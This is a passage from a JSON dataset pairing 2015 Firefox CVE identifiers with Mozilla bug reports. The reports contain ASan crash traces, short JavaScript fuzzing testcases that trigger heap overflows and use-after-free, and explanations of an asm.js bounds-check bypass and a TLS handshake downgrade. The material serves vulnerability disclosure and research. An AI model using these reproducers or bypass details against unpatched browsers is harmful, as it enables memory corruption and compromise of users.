/builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/SVGTextFrame.cpp:4564 #3 0x7fdce4726769 in SVGTextFrame::DoGlyphPositioning() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/SVGTextFrame.cpp:5017 #4 0x7fdce4715179 in UpdateGlyphPositioning /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/SVGTextFrame.cpp:5187 #5 0x7fdce4715179 in SVGTextFrame::ReflowSVG() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/SVGTextFrame.cpp:3819 #6 0x7fdce471759b in nsSVGDisplayContainerFrame::ReflowSVG() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/nsSVGContainerFrame.cpp:356 #7 0x7fdce477cdbe in nsSVGOuterSVGFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/nsSVGOuterSVGFrame.cpp:437 . . . 0x621000e67503 is located 3 bytes to the right of 4096-byte region [0x621000e66500,0x621000e67500) allocated by thread T0 (Web Content) here: #0 0x474c1b in realloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:95 #1 0x49213d in moz_xrealloc /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/memory/mozalloc/mozalloc.cpp:121 #2 0x7fdcde6d1adf in Realloc /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/media/libstagefright/../../dist/include/nsTArray.h:185 #3 0x7fdcde6d1adf in nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::EnsureCapacity(unsigned long, unsigned long) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/media/libstagefright/../../dist/include/nsTArray-inl.h:182 #4 0x7fdce471fe2a in AppendElement<mozilla::CharPosition> /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/obj-firefox/layout/svg/../../dist/include/nsTArray.h:1353 #5 0x7fdce471fe2a in SVGTextFrame::ResolvePositions(nsTArray<gfxPoint>&, bool) /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/SVGTextFrame.cpp:4555 #6 0x7fdce4726769 in SVGTextFrame::DoGlyphPositioning() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/SVGTextFrame.cpp:5017 #7 0x7fdce4715179 in UpdateGlyphPositioning /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/SVGTextFrame.cpp:5187 #8 0x7fdce4715179 in SVGTextFrame::ReflowSVG() /builds/slave/m-cen-l64-asan-ntly-0000000000/build/src/layout/svg/SVGTextFrame.cpp:3819 . . ."
      }
    ],
    "CVE-2015-2711": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1113431",
        "title": "<meta name=\"referrer\"> is ignored for navigations from the context menu and via a middle-click",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.38 Safari/537.36 Steps to reproduce: 1. Open https://scholar.google.com/scholar?q=news&mref=origin . Middle-click on \"Creating reality: How TV news distorts events\" from ERIC to open the link in a new tab. On the ERIC page, open the console and type document.referrer to see HTTP Referer. 2. Repeat 1, but left-click on the ERIC page to open it in the same tab, not a new tab. 3. Repeat 1, but from plain HTTP - http://scholar.google.com/scholar?q=news&mref=origin . Actual results: 1. document.referrer is empty - incorrect, HTTPS -> HTTP in a new tab ignores meta referrer. 2. document.referrer = \"https://scholar.google.com\" - correct, HTTPS -> HTTP in the same tab respects meta referrer. 3. document.referrer = \"http://scholar.google.com\" - correct, HTTP -> HTTP in a new tab respects meta referrer. Expected results: 1-2. document.referrer = \"https://scholar.google.com\". 3. document.referrer = \"http://scholar.google.com\". Basically, it appears that the meta referrer implementation in Bug 704320 is incomplete. When the source page is HTTPS, following a link to an HTTP page in the same tab respects meta referrer, but opening a link in a new tab does not. Both cases respect meta-referrer when the source page is plain HTTP. (Ditto for mref=unsafe-url - this is respected from HTTPS in the same tab, but not in a new tab.)"
      }
    ],
    "CVE-2015-2712": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1152280",
        "title": "Incorrect asm.js bounds check elimination vulnerability (Firefox 37.0.1)",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36 Steps to reproduce: An out-of-bounds read/write vulnerability exists in Firefox 37.0.1 (32-bit), which is similar to (but distinct from) a recent Pwn2Own vulnerability. This was tested on Windows. To trigger the vulnerability, an asm.js change-heap function must be defined with a minLengthExclusive of 0xFFFFFFFF. This function is parsed by CheckHeapLengthCondition in AsmJSValidate.cpp, which validates this value, then adds one to it, wrapping the value to zero. This zero is then stored as the module's minHeapLength, allowing heaps of any (otherwise valid) size to be used. In FoldMaskedArrayIndex, one is subtracted from the minHeapLength, wrapping back to 0xFFFFFFFF, which is assumed to be less than the heap size for bounds checking purposes. This function will then omit bounds checks for masks as large as 0x7FFFFFFF, even though much smaller heaps can be used. This allows asm.js code to read and write past the end of its heap. To reproduce, see the attached proof of concept. Actual results: Arbitrary read/write. Expected results: Probably an error or something."
      }
    ],
    "CVE-2015-2714": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1149094",
        "title": "Mixed content violation log on Fennec leaks sensitive info in URL",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2342.2 Safari/537.36 Steps to reproduce: 1. Install Fennec to an Android device which version is 4.0 or less. 2. Launch https://ie.microsoft.com/testdrive/browser/mixedcontent/assets/woodgrove.htm?SECRET#SECRET 3. Ignore SSL error and load the page 4. See logcat (via adb or some way) Actual results: Accessed URL contains query string and fragment is leaked to Logcat like below. W/GeckoConsole( 1364): [JavaScript Warning: \"Loading mixed (insecure) display content \"http://ie.microsoft.com/testdrive/browser/mixedcontent/assets/images/small_biz.png\" on a secure page\" {file: \"https://ie.microsoft.com/testdrive/browser/mixedcontent/assets/woodgrove.htm?SECRET#SECRET\" line: 0}] On Android 4.0 or less, any application having android.permission.READ_LOGS permission can retrieve other application's log data. And also, it may be sent to the third party as crash logs. So, sensitive information may be leaked. Expected results: Mixed content violation log should remove detailed information of URL,e.g, path, query string and fragment."
      }
    ],
    "CVE-2015-2716": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1140537",
        "title": "Buffer overflow xml parser",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36 Steps to reproduce: FF last version (last ASAN build) http://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-release-linux64-asan/latest/firefox-36.0.1.en-US.linux-x86_64-asan.tar.bz2 Actual results: ================================================================= ==30124==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7fff018ba800 at pc 0x45f23c bp 0x7fffffff8970 sp 0x7fffffff8128 WRITE of size 4718532 at 0x7fff018ba800 thread T0 #0 0x45f23b (/home/user/testing/firefox/firefox+0x45f23b) #1 0x7fffedd9dc34 (/home/user/testing/firefox/libxul.so+0x811cc34) #2 0x7fffe86d7e4a (/home/user/testing/firefox/libxul.so+0x2a56e4a) #3 0x7fffe86d9256 (/home/user/testing/firefox/libxul.so+0x2a58256) #4 0x7fffe86e7c59 (/home/user/testing/firefox/libxul.so+0x2a66c59) #5 0x7fffe86e39fd (/home/user/testing/firefox/libxul.so+0x2a629fd) #6 0x7fffe86e8eea (/home/user/testing/firefox/libxul.so+0x2a67eea) #7 0x7fffe73aef5d (/home/user/testing/firefox/libxul.so+0x172df5d) #8 0x7fffe72fe02e (/home/user/testing/firefox/libxul.so+0x167d02e) #9 0x7fffe7650ac1 (/home/user/testing/firefox/libxul.so+0x19cfac1) #10 0x7fffe7279ab4 (/home/user/testing/firefox/libxul.so+0x15f8ab4) #11 0x7fffe7278897 (/home/user/testing/firefox/libxul.so+0x15f7897) #12 0x7fffe70b6a69 (/home/user/testing/firefox/libxul.so+0x1435a69) #13 0x7fffe70e8bbf (/home/user/testing/firefox/libxul.so+0x1467bbf) #14 0x7fffe714549a (/home/user/testing/firefox/libxul.so+0x14c449a) #15 0x7fffe70e7b5e (/home/user/testing/firefox/libxul.so+0x1466b5e) #16 0x7fffe70f3210 (/home/user/testing/firefox/libxul.so+0x1472210) #17 0x7fffe70e8bbf (/home/user/testing/firefox/libxul.so+0x1467bbf) #18 0x7fffe714549a (/home/user/testing/firefox/libxul.so+0x14c449a) #19 0x7fffe70e7b5e (/home/user/testing/firefox/libxul.so+0x1466b5e) #20 0x7fffe70f3210 (/home/user/testing/firefox/libxul.so+0x1472210) #21 0x7fffe70e8bbf (/home/user/testing/firefox/libxul.so+0x1467bbf) #22 0x7fffe714549a (/home/user/testing/firefox/libxul.so+0x14c449a) #23 0x7fffe70e7b5e (/home/user/testing/firefox/libxul.so+0x1466b5e) #24 0x7fffe70f3210 (/home/user/testing/firefox/libxul.so+0x1472210) #25 0x7fffe70e8bbf (/home/user/testing/firefox/libxul.so+0x1467bbf) #26 0x7fffe714549a (/home/user/testing/firefox/libxul.so+0x14c449a) #27 0x7fffe70e7b5e (/home/user/testing/firefox/libxul.so+0x1466b5e) #28 0x7fffe70f3210 (/home/user/testing/firefox/libxul.so+0x1472210) #29 0x7fffe70e8bbf (/home/user/testing/firefox/libxul.so+0x1467bbf) #30 0x7fffe714549a (/home/user/testing/firefox/libxul.so+0x14c449a) #31 0x7fffe70e7b5e (/home/user/testing/firefox/libxul.so+0x1466b5e) #32 0x7fffe70f3210 (/home/user/testing/firefox/libxul.so+0x1472210) #33 0x7fffe70e8bbf (/home/user/testing/firefox/libxul.so+0x1467bbf) #34 0x7fffe714549a (/home/user/testing/firefox/libxul.so+0x14c449a) #35 0x7fffe70e7b5e (/home/user/testing/firefox/libxul.so+0x1466b5e) #36 0x7fffe70f3210 (/home/user/testing/firefox/libxul.so+0x1472210) #37 0x7fffe70e8bbf (/home/user/testing/firefox/libxul.so+0x1467bbf) #38 0x7fffe714549a (/home/user/testing/firefox/libxul.so+0x14c449a) #39 0x7fffe70e7b5e (/home/user/testing/firefox/libxul.so+0x1466b5e) #40 0x7fffe70f3210 (/home/user/testing/firefox/libxul.so+0x1472210) #41 0x7fffe70e8bbf (/home/user/testing/firefox/libxul.so+0x1467bbf) #42 0x7fffe714549a (/home/user/testing/firefox/libxul.so+0x14c449a) #43 0x7fffe7949d99 (/home/user/testing/firefox/libxul.so+0x1cc8d99) #44 0x7fffe78f8d1c (/home/user/testing/firefox/libxul.so+0x1c77d1c) #45 0x7fffebc8ed87 (/home/user/testing/firefox/libxul.so+0x600dd87) #46 0x7fffed667fa8 (/home/user/testing/firefox/libxul.so+0x79e6fa8) #47 0x7fffed753d6e (/home/user/testing/firefox/libxul.so+0x7ad2d6e) #48 0x7fffed754c93 (/home/user/testing/firefox/libxul.so+0x7ad3c93) #49 0x7fffed755b0d (/home/user/testing/firefox/libxul.so+0x7ad4b0d) #50 0x48a2fa (/home/user/testing/firefox/firefox+0x48a2fa) #51 0x7ffff6c0076c (/lib/x86_64-linux-gnu/libc.so.6+0x2176c) #52 0x48975c (/home/user/testing/firefox/firefox+0x48975c) 0x7fff018ba800 is located 0 bytes to the right of 2147237888-byte region [0x7ffe818f6800,0x7fff018ba800) allocated by thread T0 here: #0 0x471d71 (/home/user/testing/firefox/firefox+0x471d71) #1 0x7fffedd9ed25 (/home/user/testing/firefox/libxul.so+0x811dd25) #2 0x7fffedd9db81 (/home/user/testing/firefox/libxul.so+0x811cb81) #3 0x7fffe86d7e4a (/home/user/testing/firefox/libxul.so+0x2a56e4a) #4 0x7fffe86d9256 (/home/user/testing/firefox/libxul.so+0x2a58256) #5 0x7fffe86e7c59 (/home/user/testing/firefox/libxul.so+0x2a66c59) #6 0x7fffe86e39fd (/home/user/testing/firefox/libxul.so+0x2a629fd) #7 0x7fffe86e8eea (/home/user/testing/firefox/libxul.so+0x2a67eea) #8 0x7fffe73aef5d (/home/user/testing/firefox/libxul.so+0x172df5d) #9 0x7fffe72fe02e (/home/user/testing/firefox/libxul.so+0x167d02e) #10 0x7fffe7650ac1 (/home/user/testing/firefox/libxul.so+0x19cfac1) #11 0x7fffe7279ab4 (/home/user/testing/firefox/libxul.so+0x15f8ab4) #12 0x7fffe7278897 (/home/user/testing/firefox/libxul.so+0x15f7897) #13 0x7fffe70b6a69 (/home/user/testing/firefox/libxul.so+0x1435a69) #14 0x7fffe70e8bbf (/home/user/testing/firefox/libxul.so+0x1467bbf) #15 0x7fffe714549a (/home/user/testing/firefox/libxul.so+0x14c449a) #16 0x7fffe7949d99 (/home/user/testing/firefox/libxul.so+0x1cc8d99) #17 0x7fffe78f8d1c (/home/user/testing/firefox/libxul.so+0x1c77d1c) #18 0x7fffebc8ed87 (/home/user/testing/firefox/libxul.so+0x600dd87) #19 0x7fffed667fa8 (/home/user/testing/firefox/libxul.so+0x79e6fa8) #20 0x7fffed753d6e (/home/user/testing/firefox/libxul.so+0x7ad2d6e) #21 0x7fffed754c93 (/home/user/testing/firefox/libxul.so+0x7ad3c93) #22 0x7fffed755b0d (/home/user/testing/firefox/libxul.so+0x7ad4b0d) #23 0x48a2fa (/home/user/testing/firefox/firefox+0x48a2fa) #24 0x7ffff6c0076c (/lib/x86_64-linux-gnu/libc.so.6+0x2176c) SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ?? Shadow bytes around the buggy address: 0x10006030f4b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006030f4c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006030f4d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006030f4e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006030f4f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x10006030f500:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x10006030f510: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x10006030f520: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x10006030f530: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x10006030f540: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x10006030f550: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Sta==30124==ABORTING"
      }
    ],
    "CVE-2015-2717": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1154683",
        "title": "Integer overflow in libstagefright (data tag in mp4) might lead to heap overflow",
        "description": "A specially crafted mp4 file can cause a integer overflow in the MPEG4Extractor::parseMetaData() function. When 'size' is 0xffffffff a integer overflow will occur which leads to an allocation of a (almost) 0 bytes big buffer (https://dxr.mozilla.org/mozilla-central/source/media/libstagefright/frameworks/av/media/libstagefright/MPEG4Extractor.cpp#2196). Later the 0xffffffff bytes should be copied into the small buffer 'buffer' which would lead to a heap overflow. Attached is a PoC which causes the integer overflow. On the tested firefox (build from mozilla-central) using a Nexus 5 (contrary to the expected behavior) no heap overflow occurred. This behavior might be caused by the implementation of read(). read() is called (with the anticipated 0xffffffff as size) but no write into the buffer occurs."
      }
    ],
    "CVE-2015-2718": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1146724",
        "title": "Untrusted page can see webchannel responses",
        "description": "Consider: * Untrusted page http://evil.com hosts trusted page http://good.com in an iframe. * http://good.com dispatches a WebChannelMessageToChrome event - http://evil.com does not seem to have access to this event, but content.js does see it and dispatches it to the parent process - so far, so good. * WebChannel.jsm sees the event as coming from http://good.com so allows it to be processed. * WebChannel listener does it's thing and calls channel.send() to send the reply. * http://good.com does *not* see the response, but http://evil.com does. The following attachment demonstrates this in a test. browser_web_channel_iframe.html is good.com in this scenario, and browser_web_channel.html is evil.com. browser_web_channel.html sees the response to the message from browser_web_channel_iframe.html. [Setting as a security bug as a precaution - eg, we send back about:support information in a webchannel response, and if the page we allow this on doesn't explicitly prevent itself being loaded in an iframe we could have a bad information leak]"
      }
    ],
    "CVE-2015-2721": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1086145",
        "title": "NSS incorrectly permits skipping of ServerKeyExchange",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36 Steps to reproduce: We have been performing systematic state machine tests on NSS, OpenSSL, and other SSL implementations, and we found some unexpected behaviours in NSS (not all are immediately exploitable.) We will report the other weirdnesses in due course, but here's one that seems to break False Start's forward secrecy guarantee. The core issue is that the NSS client allows an ECDHE_ECDSA exchange where the server does not send its ServerKeyExchange message. In this case, NSS will take the (long-term) EC key from the ECDSA certificate, and use that instead of the server's ephemeral parameters. This violates the TLS protocol and also has some security implications for forward secrecy. The application at the client (e.g. the browser) still thinks it is engaged in an ECDHE exchange, but in fact it has been silently downgraded to a non-forward secret mixed-ECDH exchange. Consequently, if False Start is enabled, the client will start sending data encrypted under the (non forward-secret) connection keys. This breaks some of the changes of Bug942729 (https://bugzilla.mozilla.org/show_bug.cgi?id=942729). To test this behavior, we used Chrome or Firefox to connect to Gmail (which uses ECDHE-ECDSA) via a network proxy. We allow all messages to pass through, but block the ServerKeyExchange going from google to the browser. The browser still completes the handshake and starts sending data. The culprit is in the beginning of ssl3_SendClientKeyExchange in ssl3con.c: if (ss->sec.peerKey == NULL) { serverKey = CERT_ExtractPublicKey(ss->sec.peerCert); ..... } Expected results: One would expect the client to kill the handshake when it receives the ServerHelloDone without having received a ServerKeyExchange in an ECDHE exchange. A similar behavior occurs for DHE, but requires the server to send a DH-key certificate (which is much rarer in practice.)"
      }
    ],
    "CVE-2015-2724": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1143679",
        "title": "Crash [@ js::UnwindIteratorForException] or Assertion failure: moreAllocations(), at jit/JitFrameIterator.h:454 or heap-use-after-free [@ js::jit::CompactBufferReader::readByte]",
        "description": "The following testcase crashes on mozilla-central revision 436686833af0 (build with --enable-optimize --enable-posix-nspr-emulation --enable-valgrind --enable-gczeal --disable-tests --disable-debug, run with --fuzzing-safe --ion-offthread-compile=off --ion-eager): function foo() { function gen() { try { yield 1; } finally { bar(); } } for (i in gen()) { for each (var i in this) return false; } } foo(); Backtrace: Program received signal SIGSEGV, Segmentation fault. js::UnwindIteratorForException (cx=cx@entry=0x1734b60, obj=obj@entry=...) at js/src/jsobj.h:128 #0 js::UnwindIteratorForException (cx=cx@entry=0x1734b60, obj=obj@entry=...) at js/src/jsobj.h:128 #1 0x000000000071d64f in CloseLiveIterator (localSlot=<optimized out>, frame=..., cx=0x1734b60) at js/src/jit/JitFrames.cpp:388 #2 HandleExceptionIon (overrecursed=0x7fffffffb7f0, rfe=0x7fffffffc280, frame=..., cx=0x1734b60) at js/src/jit/JitFrames.cpp:464 #3 js::jit::HandleException (rfe=0x7fffffffc280) at js/src/jit/JitFrames.cpp:782 #4 0x00007ffff7fe815d in ?? () [...] #24 0x0000000000000000 in ?? () rax 0xfff9000000000000 -1970324836974592 rbx 0x1734b60 24333152 rcx 0xf 15 rdx 0x1734b78 24333176 rsi 0x16eab40 24030016 rdi 0x1743810 24393744 rbp 0x7fffffffb880 140737488337024 rsp 0x7fffffffb720 140737488336672 r8 0x17cef60 24964960 r9 0x3bb1eea0 1001516704 r10 0x17cef60 24964960 r11 0x7fffffffb720 140737488336672 r12 0x1 1 r13 0x7fffffffb8d0 140737488337104 r14 0x7fffffffb870 140737488337008 r15 0x1818938 25266488 rip 0x870b49 <js::UnwindIteratorForException(JSContext*, JS::Handle<JSObject*>)+105> => 0x870b49 <js::UnwindIteratorForException(JSContext*, JS::Handle<JSObject*>)+105>: mov (%rcx),%rdx 0x870b4c <js::UnwindIteratorForException(JSContext*, JS::Handle<JSObject*>)+108>: mov (%rdx),%rdx S-s and sec-critical because on ASan builds this shows up as a heap-use-after-free."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1164567",
        "title": "Various consumers in the tree use nsIPrincipal off-main-thread",
        "description": "nsIPrincipal doesn't have threadsafe refcounting, but it also rolls its own refcounting scheme, so it doesn't presently have any ownerthread assertions either. I just added some in bug 1164292, and hit the assertion in various places. This can lead to UAF/double-free, though we'll have to see exactly how exploitable the culprits are."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1154876",
        "title": "Flash calls PPluginModuleChild::SendSetCursor() off the main thread",
        "description": "I came across this signature on crash-stats: https://crash-stats.mozilla.com/report/index/67b8450e-48d8-4b67-9fcc-dabd02150414#allthreads It looks like the Flash player is trying to send a message, but it hits an IPC thread assertion that Bill added recently."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1160884",
        "title": "Crash [@ js::str_split_string(JSContext*, JS::Handle<js::ObjectGroup*>, JS::Handle<JSString*>, JS::Handle<JSString*>) ]",
        "description": "1. http://www.centenario1914-1918.it/it 2. This is not reliable. You may need to reload several times. 3. Crash on Windows only so far. bp-47d0057a-57bc-4292-8a38-58d5d2150503 exploitability: high Also crashes debug on Beta/38, Nightly/40"
      }
    ],
    "CVE-2015-2725": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1172076",
        "title": "Crash [@ js::jit::RValueAllocation::index() const] with heap-buffer-overflow",
        "description": "The following testcase crashes on mozilla-central revision 98820360ab66 (build with --enable-gczeal --enable-optimize=\"-O2 -g\" --enable-address-sanitizer --enable-posix-nspr-emulation --disable-jemalloc --disable-tests --disable-debug, run with --fuzzing-safe --thread-count=2 --ion-eager): function f() { return f.caller.p; } var lfGlobal = newGlobal(); for (lfLocal in this) { if (!(lfLocal in lfGlobal)) { lfGlobal[lfLocal] = this[lfLocal]; } } function dummy() { test(); function test() { function t(o, proplist) { var obj_12 = f(\"get\"); } t(); test() } } lfGlobal.offThreadCompileScript(dummy.toSource() + \"dummy();\"); lfGlobal.runOffThreadScript(); Backtrace: ==43399==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200003ad00 at pc 0x1093b32 bp 0x7fff0a7c3a00 sp 0x7fff0a7c39f8 READ of size 8 at 0x60200003ad00 thread T0 #0 0x1093b31 in js::jit::RValueAllocation::index() const js/src/jit/JitFrames.cpp:2267 #1 0x1093b31 in js::jit::SnapshotIterator::allocationValue(js::jit::RValueAllocation const&, js::jit::SnapshotIterator::ReadMethod) js/src/jit/JitFrames.cpp:1995 #2 0x109a9f4 in js::jit::InlineFrameIterator::callee(js::jit::MaybeReadFallback&) const js/src/jit/JitFrames.cpp:2509 #3 0xaf4dfc in js::FrameIter::callee(JSContext*) const js/src/vm/Stack.cpp:1108 #4 0x14c4d67 in CallerGetterImpl(JSContext*, JS::CallArgs) js/src/jsfun.cpp:265 #5 0x164b4a3 in bool JS::CallNonGenericMethod<&(IsFunction(JS::Handle<JS::Value>)), &(CallerGetterImpl(JSContext*, JS::CallArgs))>(JSContext*, JS::CallArgs) js/src/opt64asan/js/src/../../dist/include/js/CallNonGenericMethod.h:100 #6 0x164b4a3 in CallerGetter(JSContext*, unsigned int, JS::Value*) js/src/jsfun.cpp:297 #7 0xd88038 in js::jit::DoCallNativeGetter(JSContext*, JS::Handle<JSFunction*>, JS::Handle<JSObject*>, JS::MutableHandle<JS::Value>) js/src/jit/BaselineIC.cpp:1618 0x60200003ad00 is located 0 bytes to the right of 16-byte region [0x60200003acf0,0x60200003ad00) allocated by thread T0 here: #0 0x4af3f7 in __interceptor_malloc /srv/repos/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:74 #1 0x10c2cb8 in js_malloc(unsigned long) js/src/opt64asan/js/src/../../dist/include/js/Utility.h:126 #2 0x10c2cb8 in _ZL13js_pod_mallocIN2js14RelocatablePtrIN2JS5ValueEEEEPT_m js/src/opt64asan/js/src/../../dist/include/js/Utility.h:281 #3 0x10c2cb8 in js::RelocatablePtr<JS::Value>* js::SystemAllocPolicy::pod_malloc<js::RelocatablePtr<JS::Value> >(unsigned long) js/src/jsalloc.h:34 #4 0x10c2cb8 in mozilla::VectorBase<js::RelocatablePtr<JS::Value>, 1ul, js::SystemAllocPolicy, mozilla::Vector<js::RelocatablePtr<JS::Value>, 1ul, js::SystemAllocPolicy> >::convertToHeapStorage(unsigned long) js/src/opt64asan/js/src/../../dist/include/mozilla/Vector.h:772 #5 0x10c2cb8 in mozilla::VectorBase<js::RelocatablePtr<JS::Value>, 1ul, js::SystemAllocPolicy, mozilla::Vector<js::RelocatablePtr<JS::Value>, 1ul, js::SystemAllocPolicy> >::growStorageBy(unsigned long) js/src/opt64asan/js/src/../../dist/include/mozilla/Vector.h:863 #6 0x1091fa1 in mozilla::UniquePtr<mozilla::Vector<js::RelocatablePtr<JS::Value>, 1ul, js::SystemAllocPolicy>, JS::DeletePolicy<mozilla::Vector<js::RelocatablePtr<JS::Value>, 1ul, js::SystemAllocPolicy> > >::operator bool() const js/src/opt64asan/js/src/../../dist/include/mozilla/Vector.h:924 #7 0x1091fa1 in js::jit::RInstructionResults::init(JSContext*, unsigned int) js/src/jit/JitFrames.cpp:1711 #8 0x10957d6 in js::jit::SnapshotIterator::computeInstructionResults(JSContext*, js::jit::RInstructionResults*) const js/src/jit/JitFrames.cpp:2222 #9 0x10948b6 in js::jit::SnapshotIterator::initInstructionResults(js::jit::MaybeReadFallback&) js/src/jit/JitFrames.cpp:2199 #10 0x1093fc8 in js::jit::SnapshotIterator::maybeRead(js::jit::RValueAllocation const&, js::jit::MaybeReadFallback&) js/src/jit/JitFrames.cpp:2026 #11 0x109a9f4 in js::jit::InlineFrameIterator::callee(js::jit::MaybeReadFallback&) const js/src/jit/JitFrames.cpp:2509 #12 0xaf4dfc in js::FrameIter::callee(JSContext*) const js/src/vm/Stack.cpp:1108 #13 0x14c4d67 in CallerGetterImpl(JSContext*, JS::CallArgs) js/src/jsfun.cpp:265 #14 0x164b4a3 in bool JS::CallNonGenericMethod<&(IsFunction(JS::Handle<JS::Value>)), &(CallerGetterImpl(JSContext*, JS::CallArgs))>(JSContext*, JS::CallArgs) js/src/opt64asan/js/src/../../dist/include/js/CallNonGenericMethod.h:100 #15 0x164b4a3 in CallerGetter(JSContext*, unsigned int, JS::Value*) js/src/jsfun.cpp:297 #16 0xd88038 in js::jit::DoCallNativeGetter(JSContext*, JS::Handle<JSFunction*>, JS::Handle<JSObject*>, JS::MutableHandle<JS::Value>) js/src/jit/BaselineIC.cpp:1618 #17 0xe4134d in EnterBaseline(JSContext*, js::jit::EnterJitData&) js/src/jit/BaselineJIT.cpp:124 #18 0xe40c8d in js::jit::EnterBaselineMethod(JSContext*, js::RunState&) js/src/jit/BaselineJIT.cpp:156 #19 0x91e959 in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:642 #20 0x8ff70a in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:722 #21 0x8b3986 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:759 #22 0x16ad835 in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const js/src/proxy/DirectProxyHandler.cpp:77 #23 0x16ad835 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const js/src/proxy/CrossCompartmentWrapper.cpp:289 #24 0x16beb6e in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/proxy/Proxy.cpp:391 #25 0x16c1d84 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) js/src/proxy/Proxy.cpp:697 #26 0x8ff14f in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:235 #27 0x8ff14f in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:695 #28 0x8b3986 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:759 #29 0x1315c6a in js::jit::InvokeFunction(JSContext*, JS::Handle<JSObject*>, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) js/src/jit/VMFunctions.cpp:75 SUMMARY: AddressSanitizer: heap-buffer-overflow js/src/jit/JitFrames.cpp:2267 js::jit::RValueAllocation::index() const Shadow bytes around the buggy address: 0x0c047ffff550: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047ffff560: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047ffff570: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047ffff580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047ffff590: fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 =>0x0c047ffff5a0:[fa]fa fd fa fa fa 00 05 fa fa fd fa fa fa fd fd 0x0c047ffff5b0: fa fa 00 07 fa fa fd fa fa fa fd fd fa fa fd fa 0x0c047ffff5c0: fa fa fd fd fa fa fd fa fa fa fd fd fa fa 00 01 0x0c047ffff5d0: fa fa 